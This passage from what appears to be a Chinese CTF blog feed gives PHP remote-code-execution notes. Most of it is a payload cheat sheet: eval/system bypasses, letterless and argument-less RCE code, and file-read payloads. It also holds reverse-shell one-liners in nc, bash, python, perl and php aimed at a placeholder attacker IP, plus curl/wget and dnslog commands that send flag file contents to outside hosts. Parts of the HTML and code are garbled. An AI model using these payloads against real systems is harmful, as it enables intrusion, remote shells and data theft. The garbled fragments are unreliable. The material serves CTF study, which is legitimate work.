通过了解PHP的具体版本，你可以查找该版本已知的漏洞。不同PHP版本可能存在不同的安全问题，例如远程代码执行、文件包含漏洞等。</li><li>如何利用: 查找并利用该PHP版本的CVE（Common Vulnerabilities and Exposures）漏洞。例如，较旧版本的PHP可能存在未修复的远程代码执行漏洞。</li><li>位置: <code>phpinfo()</code> 输出的顶部通常显示 <code>PHP Version</code> 字段。</li></ul></li><li>加载的PHP模块<ul><li>重要性: 加载的模块揭示了服务器支持的功能。例如，curl模块允许网络请求，gd模块提供图像处理功能。某些模块可能引入额外的攻击向量。</li><li>如何利用: 通过加载的模块，可以识别出特定模块的漏洞并利用它们。例如，openssl模块的配置可能存在安全隐患。</li><li>位置: <code>phpinfo()</code> 页面</li></ul></li></ul><hr><h1 id="文件上传的探测"><a href="#文件上传的探测" class="headerlink" title="文件上传的探测"></a>文件上传的探测</h1><ul><li>功能: 使用一些在线或自建的测试脚本，探测是否允许文件上传。</li><li>使用方法:<ul><li>尝试上传不同类型的文件（如.php, .jpg）并观察服务器响应。</li><li>使用Web应用测试工具（如OWASP ZAP）中的文件上传探测功能。</li></ul></li><li>结果: 通过响应状态码或文件路径的返回，判断文件上传的成功与否及其可能的利用方式。</li></ul><hr><h1 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h1><ul><li>功能: Nikto是一款开源的Web服务器扫描器，用于检测Web服务器的漏洞和配置问题。</li><li>使用方法:<ul><li><code>nikto -h http://example.com</code></li></ul></li><li>结果: 能够发现服务器暴露的敏感文件、配置文件和其他潜在漏洞，并显示PHP版本等信息。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>文件操作</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rce总结</title>
    <link href="/2024/09/01/rce%E6%80%BB%E7%BB%93/"/>
    <url>/2024/09/01/rce%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><ul><li>assert() </li><li>preg_replace(a,b,c) :c中被a的要求匹配时。匹配部分以b(此时执行)替换</li><li>create_function </li><li>动态调用：变量当做函数用</li><li>回调函数 call_user_func(a,b) 例子：a:assert（不能是eval或是echo这种语言结构），b:$GET_[‘cmd’]<ul><li>call_user_func_array(a,b) b是数组数组中的元素会按照顺序依次作为参数传递给指定的函数或方法<ul><li>例如：function add($x, $y) $params &#x3D; [2, 3];$result &#x3D; call_user_func_array(‘add’, $params);</li></ul></li><li>array_filter(a,b) a数组b函数</li><li>array_map(a,b)  a函数b数组</li><li>${php代码}</li></ul></li></ul><h2 id="paylpd：eval-传入字符串解释其为php代码执行"><a href="#paylpd：eval-传入字符串解释其为php代码执行" class="headerlink" title="paylpd：eval()传入字符串解释其为php代码执行"></a>paylpd：eval()传入字符串解释其为php代码执行</h2><ul><li>转接头写法：eval($GET_[1])    访问…&#x2F;?1&#x3D;eval($POET_[1]);链接蚁剑<ul><li>…&#x2F;?1&#x3D;$a&#x3D;’sys’;$b&#x3D;’tem’;$c&#x3D;$a.$b;$c($POST_[1])post：1&#x3D;ls &#x2F;</li><li><?`$_GET[1]`;&1=nc 43.323.323.2323 4444 -e /bin/bash    攻击方：nc -lvnp 4444- bash -i >& /dev/tcp/<攻击者IP>/4444 0>&1- python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<攻击者IP>",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'- perl -e 'use Socket;$i="<攻击者IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'- php -r '$sock=fsockopen("<攻击者IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</li><li>经典读文件函数<ul><li>file_get_contents()</li><li>highlight_file()</li><li>fopen()</li><li>readfile()</li><li>fread()</li><li>fgetss()</li><li>fgets()</li><li>parse_ini_file()</li><li>show_source()</li><li>file()</li><li>var_dump(scandir(‘&#x2F;‘));</li><li>&#x2F;var&#x2F;www&#x2F;html&#x2F;</li></ul></li></ul></li></ul><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul><li>位点：system(“”)里面写命令liunx，保证让系统看出是字符串<ul><li>passthru</li><li>exec</li><li>shell_exec没有回显的执行函数或者设置&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1等无回显</li><li>popen</li><li>pcntl_exec</li></ul></li><li>liunx系统操作：<ul><li>find &#x2F; -name flag*  &#x2F;&#x2F;没有flag。没关系我们用<a href="https://www.runoob.com/linux/linux-comm-find.html">find</a>命令从根目录开始找。</li><li>pwd: 显示当前工作目录的路径。</li><li>ls: 列出当前目录中的文件和目录。<ul><li>ls -l  # 显示详细信息</li><li>ls -a  # 显示隐藏文件</li><li>ls -la合体</li></ul></li><li>cd: 切换目录。<ul><li>cd ..  # 返回上一级目录</li><li>cd ~  # 返回用户主目录</li></ul></li><li>cp: 复制文件或目录。<ul><li>cp source_file destination_file  # 复制文件</li><li>cp -r source_directory destination_directory  # 复制目录</li></ul></li><li>mv: 移动或重命名文件和目录。<ul><li>mv old_name new_name  # 重命名文件或目录</li><li>mv file_name &#x2F;path&#x2F;to&#x2F;directory  # 移动文件</li></ul></li><li>rm: 删除文件或目录<ul><li>rm file_name  # 删除文件</li><li>rm -r directory_name  # 删除目录</li></ul><p></p></li><li>mkdir: 创建新目录。<ul><li>mkdir new_directory</li></ul></li><li>rmdir: 删除空目录。<ul><li>rmdir directory_name</li></ul></li><li>cat: 显示文件内容。<ul><li>cat file_name</li></ul><p></p></li><li>more: 分页显示文件内容<ul><li>more file_name</li></ul></li><li>less: 分页显示文件内容，支持向前滚动。<ul><li>less file_name</li></ul></li><li>head: 显示文件的前几行。<ul><li>head file_name</li><li>head -n 10 file_name  # 显示文件的前10行</li></ul></li><li>显示文件的后几行</li><li>tail: 显示文件的后几行。<ul><li>tail file_name</li><li>tail -n 10 file_name  # 显示文件的后10行</li></ul></li><li>nano: 简单的文本编辑器。<ul><li>nano file_name</li></ul></li><li>功能强大的文本编辑器</li><li>vi 或 vim: 功能强大的文本编辑器。<ul><li>vi file_name</li><li>vim file_name</li></ul></li><li>top: 动态显示系统的运行信息，包括进程、CPU、内存使用情况。<ul><li>ps aux  # 显示所有进程的详细信息</li></ul></li><li>kill: 终止进程。<ul><li>kill process_id  # 终止指定进程</li><li>kill -9 process_id  # 强制终止指定进程</li></ul></li><li>df: 显示文件系统的磁盘使用情况。<ul><li>df</li><li>df -h  # 以人类可读的方式显示</li></ul></li><li>du: 显示目录或文件的磁盘使用情况。<ul><li>du -h  # 以人类可读的方式显示</li><li>du -sh directory_name  # 显示目录总大小</li></ul></li><li>ping: 测试网络连接。<ul><li>ping hostname_or_ip</li></ul></li><li>ifconfig: 显示或配置网络接口（需要root权限）。<ul><li>ifconfig</li><li>显示网络连接、路由表、接口状态等</li></ul></li><li>netstat: 显示网络连接、路由表、接口状态等。<ul><li>netstat</li><li>netstat -an  # 显示所有连接</li></ul></li><li>ssh: 通过SSH协议远程登录。<ul><li>ssh user@hostname_or_ip</li><li>通过SSH协议传输文件</li></ul></li><li>scp: 通过SSH协议传输文件。<ul><li>scp local_file user@hostname_or_ip:&#x2F;path&#x2F;to&#x2F;remote_directory</li><li>scp user@hostname_or_ip:&#x2F;path&#x2F;to&#x2F;remote_file local_directory</li></ul></li><li>nc: 建立TCP连接。<ul><li>nc <hostname> <port></li><li>nc localhost 80  # 连接到本地的80端口</li></ul></li><li>nc: 监听TCP端口。<ul><li>nc -l -p <port></li><li>nc -l -p 1234  # 监听本地的1234端口</li></ul></li><li>发送文件：<ul><li>nc <hostname> <port> &lt; <file></li><li>nc remote_host 1234 &lt; file.txt  # 将file.txt发送到远程主机的1234端口</li></ul></li><li>接收文件：<ul><li>nc -l -p <port> &gt; <file></li><li>nc -l -p 1234 &gt; received_file.txt  # 在本地监听1234端口并接收文件到received_file.txt</li></ul></li><li>nc: 端口扫描。<ul><li>nc -zv <hostname> <start_port>-<end_port></li><li>nc -zv localhost 80-100  # 扫描本地的80到100端口</li></ul></li><li>Curl (curl)<ul><li>curl: 下载文件。<ul><li>curl -O <URL></li><li>curl -O <a href="http://example.com/file.txt">http://example.com/file.txt</a>  # 下载一个文件</li></ul></li><li>curl: 上传文件。<ul><li>curl -T <file> <URL></li><li>curl -T file.txt <a href="ftp://ftp.example.com/">ftp://ftp.example.com/</a>  # 将file.txt上传到FTP服务器</li><li>发送GET请求</li></ul></li><li>curl: 发送GET请求。<ul><li>curl <URL></li><li>curl <a href="http://api.example.com/data">http://api.example.com/data</a>  # 发送</li></ul></li></ul></li><li>sh命令会将文件中的内容当作命令来执行</li><li>执行命令时，可以在没有写完的命令后面加\，实现将一条命令多行化，以行末没有\为终止，如下相当于执行了cat flag.txt</li><li>ca\     t f\      lag.\  txt</li><li>linux中,利用rev可将文件内容倒置，同时可以配合&gt;,*使用echo ‘123456’ &gt; test.txt：创建文件 test.txt 并写入内容 123456。</li><li>rev test.txt：反转文件 test.txt 的内容，输出 654321。</li><li>输入 * 并按回车：Shell 将 * 展开为 rev test.txt 并执行，输出 654321。</li><li><ul><li><blockquote><p>a.txt：Shell 将 * 展开为 rev test.txt 并执行，将输出重定向到 a.txt。</p></blockquote></li></ul></li><li>cat a.txt：查看 a.txt 文件的内容，输出 654321。</li><li><blockquote><p>rev：创建一个空文件名为 rev 的文件，如果 rev 文件已经存在，则会清空其内容。</p></blockquote></li><li>linux中,dir命令和ls效果基本一样，只有配合重定向符写入文件时有一些差别，ls写入文件中时，每个文件名都是单独一行，它会自动换行，有时会影响到我们的命令执行，而dir会把内容全部写入一行中，同时会自动补全空格</li></ul></li></ul><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><ul><li>符号<ul><li>;联合执行 </li><li>||或  绕过黑洞</li><li>&amp;&amp;与</li><li>|传到</li><li>?不确定</li><li>*通配</li><li>. &gt;命令会将原有文件内容覆盖，&gt;&gt;会将字符串添加到文件内容末尾，不会覆盖原有的内容</li></ul></li></ul><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ul><li><p>空格   ${IFS}     $IFS$9     %09 </p><p>​         在env或者printenv环境变量里找空格system(env | grep ‘ ‘)得到MYVAR&#x3D;hello world${MYVAR:5:1} 或者echo@123表示即使123出错也不要报错，echo~123取反  </p></li><li><p>cat过滤</p><ul><li>echo base64命令|base64 -d|sh    </li><li>echo hex命令|xxd -r -p|sh </li><li>换成 fmt more less rev ca\t</li></ul></li><li><p>关键字过滤</p><ul><li>插入反斜线 ca\t     贴贴’c’’a’’t’  ${}拼凑关键词  插入空ca’’t</li><li>对于匹配文件名用通配符[a-s]</li><li>设置变量 cmd&#x3D;ab;a&#x3D;l;b&#x3D;s;$a$b</li></ul></li><li><p>禁用;</p><ul><li>||代替</li></ul></li></ul><h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><ul><li>preg_replace(‘&#x2F;[a-z]+((?R)?)&#x2F;‘虽然只允许无参数，但是允许函数套用。</li><li>获得flag.php<ul><li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}</li><li>c&#x3D;$d&#x3D;opendir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d))){echo”$f\n”;}</li><li>c&#x3D;$d&#x3D;dir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;$d-&gt;read())){echo$f.”\n”;}</li><li>print_r(glob(“*”)); &#x2F;&#x2F; 列当前目录</li><li>print_r(glob(“&#x2F;*”)); &#x2F;&#x2F; 列根目录</li><li>scandir(‘.’): &#x2F;&#x2F;获得目录 <ul><li>取出. <ul><li>current(localeconv())</li><li>char(46)&gt;&gt;char(rand())    &#x2F;&#x2F;超多次重放</li><li>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))&#x2F;&#x2F;php7</li></ul></li><li>操作数组：<ul><li>pos() current()第一个元素</li><li>end()- 将内部指针指向数组中的最后一个元素，井输出</li><li>next()- 将内部指针指向数组中的下一个元素，并输出</li><li>prev()- 将内部指针指向数组中的上一个元素，并输出</li><li>reset()- 将内部指针指向敌组中的第一个元素，井输出</li><li>each()— 返回当前元素的键名和键值，井将内部指针向前移动</li></ul></li></ul></li></ul></li><li>取出文件<ul><li>如果flag-php在最后一个，直接用end（）取出即可。</li><li>(1)array_reverse()&#x2F;&#x2F;转置数组<ul><li>仅限于flag.php在数组的倒数第二个位置这种悄况下。</li><li>?exp&#x3D;print_r(next(array_reverse(scandir(pos(localeconv()))))):</li></ul></li><li>(2)array_rand(array_flip()) &#x2F;&#x2F;filp键值互换，rand随机取键<ul><li>flag.php位置在哪都可以，但是他不是100%成功的，需要重放．概率问题</li><li>?exp&#x3D;print_r(array_rand(array_flip(scandir(pos(localeconv())))));</li></ul></li></ul></li><li>session_id(session_star())   更改cookie：PHPSESSID&#x3D;flag.php&#x2F;&#x2F;字符串有长度限制,相当于想写啥就写啥命令不能有空格，因为cookie不解析空格</li><li>end(getallheaders())     &#x2F;&#x2F;得到http包最后字符串，得到任意字符串,甚至可以命令执行，套进system等函数</li><li>取get的最后一个参数       end(pos(get_defined_vars()))       </li><li>取post的最后一个参数      end(next(get_defined_vars()))      记得bp发包<ul><li>读取flag.php<ul><li>文件读取的方法<ul><li>var_dump(file_get_contents())</li><li>show_source()</li><li>highlight_file()</li><li>readfile()</li></ul></li><li>命令执行的方法<ul><li>system(end(next(get_defined_vars())))     post传字符串传入 cat flag.php</li></ul></li></ul></li></ul></li></ul><h2 id="无字母RCE"><a href="#无字母RCE" class="headerlink" title="无字母RCE"></a>无字母RCE</h2><ul><li>php5<ul><li>异或  post传 _&#x3D;phpinfo<ul><li>assert($<em>POST[</em>])</li><li><pre><code class="php">&lt;?php$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); $___=$$__;$_($___[_]);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">- 取反  post传   <span class="hljs-number">2</span>=phpinfo<br>  - ```php<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li>递增运算 post传_&#x3D;phpinfo<ul><li><pre><code class="php">&lt;?php$_=[];$_=@&quot;$_&quotfigure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">- php7<br>  - 取反脚本/异或脚本+动态调用<br>    - 如(<span class="hljs-string">&#x27;phpinfo‘//取反结果)();(&#x27;</span><span class="hljs-keyword">system</span><span class="hljs-comment">//需要变化&#x27;)(ls/ls -la)</span><br>    - ```php<br>      <span class="hljs-symbol">$</span>a=<span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br>      <span class="hljs-symbol">$</span>a();<br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul></li></ul><h2 id="通过临时文件代码执行"><a href="#通过临时文件代码执行" class="headerlink" title="通过临时文件代码执行"></a>通过临时文件代码执行</h2><ul><li>强制上传表单.php中随便上传,txt文件<ul><li>POST &#x2F;?cmd&#x3D;.+&#x2F;???&#x2F;???????[@-[]? HTTP&#x2F;1.1</li><li>…</li><li>ls &#x2F;</li></ul></li></ul><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><ul><li>反弹shell<ul><li>nc 43.323.323.2323 4444 -e &#x2F;bin&#x2F;bash    攻击方：nc -lvnp 4444</li><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&lt;攻击者IP&gt;&#x2F;4444 0&gt;&amp;1</li><li>python -c ‘import socket,subprocess,os; s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((“&lt;攻击者IP&gt;”,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p&#x3D;subprocess.call([“&#x2F;bin&#x2F;bash”,”-i”]);’</li><li>perl -e ‘use Socket;$i&#x3D;”&lt;攻击者IP&gt;”;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“&#x2F;bin&#x2F;sh -i”);};’</li><li>php -r ‘$sock&#x3D;fsockopen(“&lt;攻击者IP&gt;”,4444);exec(“&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li></ul></li><li>curl&#x2F;wget外带数据 :<ul><li>首先在自己的公网ip的网站目录下建立一个record.php的文件，里面写下如下代码：</li><li>开始构造请求（读取不全的话可以进行编码<code>cat flag|base64</code>）：</li><li>curl http:&#x2F;&#x2F;<em>.</em>.*.**&#x2F;record.php?data&#x3D;<code>cat flag|base64</code></li><li>wget http:&#x2F;&#x2F;<em>.</em>.<em>.</em>&#x2F;record.php?data&#x3D;<code>cat flag|base64</code></li><li>执行结果无回显，通过burpsuite的Collaborator 服务器记录，利用<code>curl</code>将执行结果带出来，exp如下</li><li><a href="http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`">http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`</a></li></ul></li><li>dnslog:<ul><li>?cmd&#x3D;<code>sed -n &quot;3.4p&quot;fla?.php|base64</code>;curl ${a:10:30}.&lt;替换的dnslog&gt;</li></ul></li><li>echo写shell或者cat flag &gt; test或者cp flag test等</li><li>我们可以使用$(sleep%091)来测试命令是否成功执行</li><li>可以看到sleep 1，成功的使得页面延时了1秒返回。但是对于$(ls)，我们是无法看到回显的。这是因为使用$(ls)会把ls命令执行的结果作为参数传递给ping，ping将其作为域名进行解析，但是无法得到结果，因此把域名解析失败的错误输出到错误输出中，但php的system函数只输出了标准输出的内容，没有输出标准错误，因为我们无法看到结果。</li><li>我们可以通过重定向标准错误到标准输出中，来让system函数输出错误回显，获取我们注入命令的结果。在sh中，错误描述符的编号是2，因此通过2&gt;&#x2F;dev&#x2F;stdout就可以把错误重定向到标准输出中。</li><li>完整的命令为”$(ls%09&#x2F;)”%092&gt;&#x2F;dev&#x2F;stdout，该命令可以列举根目录的文件。这里双引号的作用是，ls的输出会产生换行，导致ping只会将第一个结果作为错误输出出来，因此套在双引号内部，可以将结果全部回显。</li></ul><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ul><li>eval($c)&#x2F;&#x2F;eval(“var_dump($code)”);类似于这种注意闭合<ul><li>查看当前目录<ul><li>c&#x3D;print_r(scandir(dirname(‘<strong>FILE</strong>‘)));</li><li>print_r(scandir(dirname(<strong>FILE</strong>)));</li><li>c&#x3D;system(“ls”);</li></ul></li><li>再看根<ul><li>c&#x3D;print_r(scandir(‘&#x2F;‘));</li><li>c&#x3D;var_export(scandir(‘&#x2F;‘));</li><li>c&#x3D;var_dump(glob(‘&#x2F;*’));</li><li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}die(); &#x2F;&#x2F;有open_basedir限制</li></ul></li><li>读取flag<ul><li>?c&#x3D;system($_GET[‘a’]);&amp;a&#x3D;cat flag.php;</li><li>?c&#x3D;echo <code>cat fl&#39;&#39;ag.php</code>;</li><li>?c&#x3D;highlight_file(next(array_reverse(scandir(“.”))));</li><li>?c&#x3D;eval(end(current(get_defined_vars())));&amp;a&#x3D;system(“cat flag.php”);</li><li>?c&#x3D;passthru(‘cat &#x2F;flag_is_her3’);</li><li>?c&#x3D;a&#x3D;g;cat$IFS$1fla$a.php</li><li>?c&#x3D;system(“cat fl*g.php”);</li><li>?c&#x3D;system(“tac fl*g.php”);</li><li>?c&#x3D;print_r(file(‘flag.php’));</li><li>?c&#x3D;var_dump(file(‘flag.php’));</li><li>?%20num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  &#x2F;&#x2F;对应char脚本</li><li>?c&#x3D;exec(%27cat%20&#x2F;flag_is_her3%27,$array);var_dump($array);</li><li>?c&#x3D;readfile(“flag.php”);</li><li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgets($a);echo $line;}        &#x2F;&#x2F;一行一行读取</li><li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgetc($a);echo $line;} &#x2F;&#x2F;一个一个字符读取</li><li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgetcsv($a);var_dump($line);}</li><li>?c&#x3D;system(“cp fl*g.php a.txt “); 访问&#x2F;a.txt</li><li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac%20f*');?></li><li>?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls /');?></li><li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;       &#x2F;&#x2F;(<?php system("tac flag.php");?>)</li><li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</li><li>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}f???????</li><li>?c&#x3D;&#x2F;???&#x2F;????64%20????.???  # &#x2F;bin&#x2F;base64 flag.php</li><li>?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????????  # &#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php</li><li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while($b&#x3D;fgets($a)){echo $b;}</li><li>?c&#x3D;system(‘echo -e “ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); “ &gt; a.php’);  访问&#x2F;a.php?c&#x3D;system(“tac flag.php”);</li><li>?c&#x3D;system(“cat fl*g.php | grep  -E ‘fl.g’ “);</li></ul></li><li>无所谓，文件包含会出手<ul><li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;不用分号</li><li>GET：?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</li><li>POST：<?php system('tac flag.php');?></li><li>c&#x3D;include(‘flag.php’);echo $flag;</li><li>c&#x3D;include($_GET[‘1’]); ?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</li><li>c&#x3D;include(‘flag.php’);var_dump(get_defined_vars());&#x2F;&#x2F;var_dump:输出注册变量&#x2F;&#x2F;get_defined_vars():函数返回由所有已定义变量所组成的数组</li><li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());</li><li>c&#x3D;include(“&#x2F;flag.txt”);$ss&#x3D;ob_get_contents();ob_end_clean();echo $ss;</li><li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());exit();</li><li>或者</li><li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());die();</li><li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}die();</li><li>或者</li><li>c&#x3D;var_export(glob(‘&#x2F;*’));die();</li></ul></li><li><code>include &quot;flag.php&quot;;</code>，这里面应该有flag变量，用<a href="https://www.runoob.com/php/php-get_defined_vars-function.html">get_defined_vars()</a> 函数+var_dump全部输出出来。<ul><li>var_dump(get_defined_vars());</li></ul></li></ul></li></ul><h2 id="system"><a href="#system" class="headerlink" title="system();"></a>system();</h2><ul><li>tac \find &#x2F; -inum 3673632<ul><li>printf &#x2F;fla &gt; &#x2F;tmp&#x2F;zer0b</li><li>printf g &gt;&gt; &#x2F;tmp&#x2F;zer0b</li><li>tac `tac &#x2F;tmp&#x2F;zer0b</li><li>利用bashfuck直接跑</li></ul></li></ul><h2 id="fuzzshell"><a href="#fuzzshell" class="headerlink" title="fuzzshell"></a>fuzzshell</h2><p>1.第一行为输入命令，文件地址，或者其他数据2.第二行为黑名单，用 “,” 隔开如： flag,eval,cat,system ，然后点击黑名单，会清除输出中存在黑名单的数据3.然后点击去重。4.点击复制后导入到burpsuite进行fuzz            问题是占资源该超频了</p><ul><li>命令混淆： 对linux命令进行简单的混淆</li><li>读文件+混淆： 不需要输入命令，输入文件的地址即可如&#x2F;flag (或者&#x2F;f* &#x2F;f???)</li><li>读文件：只输出一些能查看文件的命令不进行混淆</li><li>php读文件：题目环境存在include()文件包含的情况下使用</li><li>php代码执行：题目环境中存在eval()等情况下使用</li><li>八进制编码：</li><li>十六进制编码：</li><li>IP编码：ipv4地址编码，SSRF使用</li><li>命令混淆： 对linux命令进行简单的混淆</li><li>读文件+混淆： 不需要输入命令，输入文件的地址即可如&#x2F;flag (或者&#x2F;f* &#x2F;f???)</li><li>读文件：只输出一些能查看文件的命令不进行混淆</li><li>php读文件：题目环境存在include()文件包含的情况下使用</li><li>php代码执行：题目环境中存在eval()等情况下使用</li><li>八进制编码：</li><li>十六进制编码：</li><li>IP编码：ipv4地址编码，SSRF使用</li></ul><h2 id="补充：封装协议的利用"><a href="#补充：封装协议的利用" class="headerlink" title="补充：封装协议的利用"></a>补充：封装协议的利用</h2><ul><li>fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数stream_wrapper_register() </li><li>php:&#x2F;&#x2F;input   